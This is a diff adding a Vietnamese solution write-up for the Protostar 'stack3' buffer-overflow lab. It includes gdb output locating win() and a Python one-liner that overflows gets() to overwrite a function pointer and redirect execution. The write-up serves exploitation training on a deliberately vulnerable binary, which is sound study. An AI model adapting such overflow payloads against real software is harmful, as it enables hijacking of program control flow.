@@ -41,7 +41,28 @@ int main(int argc, char **argv)
 
 ## Solutions
 
+`STACK THREE` quay lại với khai thác buffer overflow thông qua hàm nhập stdin gets().
 
+Trong source code ta thấy hàm main khai báo một con trỏ hàm `volatile int (*fp)();`, con trỏ này nhận giá trị bằng 0 và nếu được thay đổi thỏa mãn điều kiện != 0 nó sẽ được gọi và chuyển flow chương trình tới địa chỉ bằng với giá trị của nó. Và đề bài yêu cầu flow đến hàm `win()`. Vậy nên điều đầu tiên đó là tìm địa chỉ của `win()` và ghi đè nó vào con trỏ hàm fp.
+
+Tìm đại chỉ hàm win() qua gdb:
+
+```
+root@protostar:/opt/protostar/bin# gdb -q ./stack3                                                      
+Reading symbols from /opt/protostar/bin/stack3...done.                                                  
+(gdb) set disassembly-flavor intel                                                                      
+(gdb) p win                                                                                             
+$1 = {void (void)} 0x8048424 <win>                                                                      
+(gdb)  
+```
+
+Việc tiếp theo là overwrite vào biến `fp` với giá trị là địa chỉ `win()` đã tìm ra ở trên:
+
+```
+root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "\x24\x84\x04\x08"' | ./stack3           
+calling function pointer, jumping to 0x08048424                                                         
+code flow successfully changed
+```
 
 ## Documents
 
